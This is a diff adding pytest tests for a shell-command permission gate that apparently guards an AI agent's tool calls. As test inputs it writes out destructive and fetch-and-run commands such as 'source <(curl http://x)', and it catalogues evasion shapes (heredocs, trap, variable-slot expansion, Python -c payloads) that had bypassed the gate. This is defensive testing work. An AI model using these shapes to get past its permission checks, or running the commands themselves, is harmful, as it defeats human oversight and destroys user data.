+    _run(gate, command)
+    assert gate._recorder.asked, (
+        f"BYPASS — heredoc body fed to a shell interpreter not scanned: {command!r}"
+    )
+    assert expected in " ".join(a[0] for a in gate._recorder.asked), (
+        f"expected {expected!r} in asked, got {gate._recorder.asked}"
+    )
+    assert gate._recorder.spawned == [], "denied command still reached the shell"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # cat/tee are not interpreters — body is data, must NOT prompt.
+        "cat <<EOF\nrm -rf /tmp/x\nEOF",
+        "tee out.txt <<EOF\nrm -rf /tmp/x\nEOF",
+        # python3 is not in SHELL_INTERPRETERS — its body is Python, not shell
+        # code (same known-limit as `python -c`).
+        "python3 <<EOF\nimport os; os.system('rm -rf x')\nEOF",
+        # Shell interpreter WITH a -c flag ignores stdin/heredoc — the body is
+        # NOT executed, so blanking it is still correct.
+        "bash -c 'echo hi' <<EOF\nrm -rf /tmp/x\nEOF",
+        # An interpreter NAME that is merely an argument is not the receiver.
+        # `echo`/`grep` own the executable slot, so the body is data. A word-
+        # matching receiver search charged both of these a false prompt.
+        "echo bash <<EOF\nrm -rf /tmp/x\nEOF",
+        "grep bash <<EOF\nrm -rf /tmp/x\nEOF",
+    ],
+    ids=[
+        "cat", "tee", "python3", "bash-c-ignores-heredoc",
+        "interpreter-name-as-argument-echo", "interpreter-name-as-argument-grep",
+    ],
+)
+def test_heredoc_body_to_non_interpreter_is_not_scanned(gate, command):
+    _run(gate, command)
+    # The body must NOT trigger any prompt — it is data, not commands.
+    for asked in gate._recorder.asked:
+        assert "rm" not in asked[0], (
+            f"false positive — data heredoc body prompted: {command!r}"
+        )
+    # But the command itself still runs (the gate does not block it).
+    assert gate._recorder.spawned, f"safe command was blocked: {command!r}"
+
+
+# ── source / . (dot-source) fed by process substitution ────────────────────
+# `source <(curl url)` feeds the output of curl to source via a FIFO —
+# the same "unreadable payload handed to an interpreter" shape as `curl | sh`.
+# `source` / `.` are shell builtins that execute code from a file; `<(…)`
+# produces a FIFO path, not a real file, so the "payload lives in a FILE"
+# genuine-indirection exclusion does not apply.
+
+
+@pytest.mark.parametrize(
+    "command,expected",
+    [
+        ("source <(curl http://x)", "source"),
+        (". <(curl http://x)", "."),
+    ],
+    ids=["source", "dot"],
+)
+def test_source_procsub_is_gated(gate, command, expected):
+    _run(gate, command)
+    # `source <(curl x)` and `. <(curl x)` must prompt — they run unreadable
+    # bytes as shell code.
+    assert gate._recorder.asked, (
+        f"BYPASS — procsub feeding source/dot not gated: {command!r}"
+    )
+    assert "process substitution feeds" in gate._recorder.asked[0][0], (
+        f"expected procsub reason, got: {gate._recorder.asked}"
+    )
+    assert expected in gate._recorder.asked[0][0]
+    assert gate._recorder.spawned == [], "denied command still reached the shell"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # source with a real file — genuine indirection, not gated.
+        "source ./setup.sh",
+        ". ./setup.sh",
+        # Procsub is in a different segment — must NOT leak to source.
+        "diff <(sort a) <(sort b) && source build.sh",
+        "diff <(sort a) <(sort b) && . build.sh",
+    ],
+    ids=["source-file", "dot-file", "diff-procsub-source", "diff-procsub-dot"],
+)
+def test_source_procsub_is_not_invented(gate, command):
+    _run(gate, command)
+    for asked in gate._recorder.asked:
+        assert "process substitution feeds" not in asked[0], (
+            f"false positive — procsub gate fired on non-procsub source: {command!r}"
+        )
+
+
+# ── `trap '<command>' SIG` — a command string parked in an argument slot ────
+# The same shape as `eval "rm -rf x"`: the command is right there in the string
+# being scanned. All three spellings ran unprompted before COMMAND_STRING_BUILTINS
+# (measured 2026-07-29 by dispatching through a real ToolRegistry and checking
+# whether the target file survived).
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "trap 'rm -rf build' EXIT",
+        'trap "rm -rf build" EXIT',
+        # `--` ends trap's own options; the action follows it.
+        "trap -- 'rm -rf build' EXIT",
+        # Several signals — only the FIRST operand is the action.
+        "trap 'rm -rf build' INT TERM EXIT",
+        # Nested one level down: the outer `-c` payload is re-entered, and the
+        # trap inside it must be scanned by the same rules.
+        "bash -c \"trap 'rm -rf build' EXIT; make\"",
+        # A trap whose action is dangerous by FLAG rather than by name.
+        "trap 'git reset --hard' EXIT",
+    ],
+    ids=["single", "double", "dashdash", "multi-signal", "nested", "flag-combo"],
+)
+def test_trap_action_is_scanned(gate, command):
+    _run(gate, command)
+    assert gate._recorder.asked, (
+        f"BYPASS — trap action not scanned: {command!r}"
+    )
+    assert gate._recorder.spawned == [], "denied command still reached the shell"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "trap 'echo done' EXIT",
+        "trap 'git status --short' EXIT",
+        # `-` resets the handler and `''` ignores the signal — neither is a
+        # command, and splicing them as one would be a parse of nothing.
+        "trap - EXIT",
+        "trap '' INT",
+        "trap -p",
+        # A later segment's `rm` is not trap's payload: the splice must stop at
+        # the separator, like eval's does.
+        "trap 'echo done' EXIT; ls",
+    ],
+    ids=["echo", "git-status", "reset", "ignore", "print", "segment-bound"],
+)
+def test_trap_does_not_invent_prompts(gate, command):
+    _run(gate, command)
+    assert gate._recorder.asked == [], (
+        f"false positive — benign trap gated: {command!r} -> {gate._recorder.asked}"
+    )
+
+
+# ── `$NAME` in the executable slot ─────────────────────────────────────────
+# Parking the command in a variable used to drop the token outright ("$" and
+# "=" were a single skip rule), so `RM=rm; $RM -f x` ran unprompted. The value
+# is recoverable in two cases and only those: assigned in the same command, or
+# present in the environment this process will hand to the shell.
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "RM=rm; $RM -rf build",
+        "RM=rm; ${RM} -rf build",
+        # Prefix-assignment spelling.
+        "RM=rm $RM -rf build",
+        # A resolved interpreter also regains its `-c` payload scan, which is
+        # the whole point of expanding BEFORE the other rules run.
+        "SH=/bin/sh; $SH -c 'rm -rf build'",
+        # Resolved into a wrapper, whose own table then applies.
+        "S=sudo; $S rm -rf build",
+    ],
+    ids=["bare", "braced", "prefix", "interpreter", "wrapper"],
+)
+def test_executable_slot_variable_is_expanded(gate, command):
+    _run(gate, command)
+    assert gate._recorder.asked, (
+        f"BYPASS — variable in executable slot not expanded: {command!r}"
+    )
+    assert gate._recorder.spawned == [], "denied command still reached the shell"
+
+
+def test_environment_variable_in_executable_slot_is_expanded(gate, monkeypatch):
+    """A name this process can read is one the shell will resolve identically."""
+    monkeypatch.setenv("ASI_TEST_SHELL", "/bin/sh")
+    _run(gate, "$ASI_TEST_SHELL -c 'rm -rf build'")
+    assert gate._recorder.asked, "BYPASS — env-resolved interpreter not scanned"
+    assert gate._recorder.spawned == [], "denied command still reached the shell"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # Argument position is deliberately NOT expanded: a value that reads
+        # like a dangerous name must not invent a prompt.
+        "MSG=rm; echo $MSG",
+        "MSG=rm; git commit -m \"$MSG\"",
+        # Benign values in the executable slot resolve to benign commands.
+        "PY=python3; $PY -c 'print(1)'",
+        "VENV=/usr; ${VENV}/bin/python3 -c 'print(1)'",
+        # Unknown name: unchanged behaviour, no guess.
+        "$ASI_NOT_SET_ANYWHERE ls",
+    ],
+    ids=["arg-echo", "arg-commit", "python", "venv-path", "unknown"],
+)
+def test_variable_expansion_does_not_invent_prompts(gate, command):
+    _run(gate, command)
+    assert gate._recorder.asked == [], (
+        f"false positive — variable expansion gated a benign command: "
+        f"{command!r} -> {gate._recorder.asked}"
+    )
+
+
+def test_variable_value_with_metacharacters_is_refused(gate):
+    """An expansion that would restructure the token is not applied.
+
+    The scan's tokens carry positions into the string they came from, so a
+    value introducing a separator or a redirect cannot simply be pasted in.
+    Refusing keeps the old "unknown executable" behaviour instead of feeding
+    the scan a token whose shape lies about what it is.
+    """
+    assert gt_mod._expand_exec_slot_var("$X", {"X": "rm; ls"}) is None
+    assert gt_mod._expand_exec_slot_var("$X", {"X": "rm"}) == "rm"
+    assert gt_mod._expand_exec_slot_var("$X/bin/py", {"X": "/opt"}) == "/opt/bin/py"
+    assert gt_mod._expand_exec_slot_var("$X", {}) is None
+    assert gt_mod._expand_exec_slot_var("plain", {"plain": "rm"}) is None
+
+
+# ── `python -c` — the one non-shell payload that CAN be read ────────────────
+# Measured 2026-07-30 by dispatching 41 real command shapes at this gate: it
+# prompted on 36 (backticks, $(), xargs, find -exec, eval, procsub,
+# here-strings, trap, wrappers, loops, nested `bash -c`) and the survivors were
+# `python3 -c "shutil.rmtree(...)"`, `perl -e 'unlink ...'`, and shapes that are
+# inert (`alias r=rm; r -rf x` — bash does not expand an alias defined on the
+# same line) or by design (`make clean`). "Not shell" had been read as "not
+# checkable"; Python has a parser, so it is checkable with its own.
+
+
+class TestPythonPayloadDestructiveCalls:
+    """A destructive call is the same effect as the executable the gate knows."""
+
+    @pytest.mark.parametrize(
+        "command,expected",
+        [
+            ('python3 -c "import shutil;shutil.rmtree(\'/tmp/x\')"', "shutil.rmtree"),
+            ("python3 -c 'import shutil as sh; sh.rmtree(\"/tmp/x\")'", "shutil.rmtree"),
+            ("python3 -c 'from shutil import rmtree as rt; rt(\"/tmp/x\")'", "shutil.rmtree"),
+            ('python3 -c "__import__(\'shutil\').rmtree(\'/tmp/x\')"', "shutil.rmtree"),
+            ("python3 -c 'from pathlib import Path; Path(\"/tmp/x\").unlink()'", "pathlib.Path.unlink"),
+            ("python3 -c 'import os; os.remove(\"/tmp/x\")'", "os.remove"),
+            ("python -c 'import os; os.truncate(\"/tmp/x\", 0)'", "os.truncate"),
+        ],
+        ids=["rmtree", "module-alias", "from-import-alias", "dunder-import",
+             "path-unlink", "os-remove", "os-truncate"],
+    )
+    def test_it_prompts_and_names_the_call(self, gate, command, expected):
+        result = _run(gate, command)
+        assert gate._recorder.asked, f"ran unprompted: {command!r}"
+        assert expected in gate._recorder.asked[0][0], (
+            f"the reason must name the call: {gate._recorder.asked[0][0]!r}"
+        )
+        assert not gate._recorder.spawned, "denied, but the command still ran"
+        assert not result.ok
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "python3 -c 'print(1+1)'",
+            "python3 -c 'import json;print(json.dumps({}))'",
+            # Writing and creating are what the agent is FOR.
+            "python3 -c \"open('/tmp/x','w').write('hi')\"",
+            "python3 -c 'import subprocess; subprocess.run([\"ls\",\"-la\"])'",
+            "python3 -m pytest -q",
+            "python3 script.py --flag",
+            # Does not parse, so it will not run either.
+            "python3 -c 'this is not python'",
+        ],
+        ids=["print", "json", "write", "subprocess-ls", "module-pytest",
+             "script-file", "syntax-error"],
+    )
+    def test_ordinary_python_is_not_gated(self, gate, command):
+        _run(gate, command)
+        assert gate._recorder.asked == [], (
+            f"false positive — benign python was gated: {command!r} -> "
+            f"{gate._recorder.asked}"
+        )
+
+
+class TestPythonPayloadShellEscape:
+    """A command handed back to the shell re-enters THIS scan.
+
+    Spliced rather than judged in place, so the payload meets every rule the
+    un-nested spelling does. The `git reset --hard` case is the one that proves
+    it: recognising that needs the flag-combo table, the segment tokeniser and
+    the basename reduction — a second, private copy of the rules inside the
+    Python check would have caught `rm` and missed it.
+    """
+
+    @pytest.mark.parametrize(
+        "command,expected",
+        [
+            ('python3 -c "import os;os.system(\'rm -rf /tmp/x\')"', "rm"),
+            ("python3 -c 'import subprocess; subprocess.run([\"rm\",\"-rf\",\"/tmp/x\"])'", "rm"),
+            ('python3 -c "import os;os.system(\'git reset --hard\')"', "git"),
+            ('python3 -c "import os;os.popen(\'pkill -f node\')"', "pkill"),
+        ],
+        ids=["os-system-rm", "subprocess-argv-rm", "os-system-git-hard", "os-popen-pkill"],
+    )
+    def test_the_embedded_command_is_scanned(self, gate, command, expected):
+        _run(gate, command)
+        assert gate._recorder.asked, f"ran unprompted: {command!r}"
+        assert expected in gate._recorder.asked[0][0], (
+            f"the embedded command was not scanned: {gate._recorder.asked[0][0]!r}"
+        )
+
+    def test_a_command_built_at_runtime_is_prompted_as_unreadable(self, gate):
+        """The doctrine the pipe rule already applies: unreadable means ask."""
+        _run(gate, "python3 -c 'import subprocess,sys; subprocess.run(sys.argv[1], shell=True)'")
+        assert gate._recorder.asked
+        assert "not visible" in gate._recorder.asked[0][0]
+
+
+class TestPythonPayloadResolution:
+    """The analyser, directly — name resolution is what makes it non-evadable."""
+
+    @pytest.mark.parametrize(
+        "code,calls",
+        [
+            ("import shutil; shutil.rmtree('x')", {"shutil.rmtree"}),
+            ("import shutil as s; s.rmtree('x')", {"shutil.rmtree"}),
+            ("from shutil import rmtree; rmtree('x')", {"shutil.rmtree"}),
+            ("from os import remove as r; r('x')", {"os.remove"}),
+            ("import os.path; os.remove('x')", {"os.remove"}),
+            # One more binding, the way the shell scan follows `RM=rm; $RM -f x`.
+            ("import shutil; f = shutil.rmtree; f('x')", {"shutil.rmtree"}),
+            # A local function that merely SHARES the name is not the stdlib
+            # one, and must not be gated.
+            ("def rmtree(p): pass\nrmtree('x')", set()),
+            # Nor is an unrelated method that happens to be called unlink.
+            ("conn.unlink('x')", set()),
+        ],
+        ids=["plain", "module-alias", "from", "from-alias", "submodule-import",
+             "rebound-name", "shadowed-name", "unrelated-method"],
+    )
+    def test_names_resolve_through_every_alias_form(self, code, calls):
+        found, _shell, _opaque = gt_mod._python_payload_effects(code)
+        assert found == calls
+
+    def test_an_unparseable_payload_yields_nothing(self):
+        assert gt_mod._python_payload_effects("def (") == (set(), [], False)
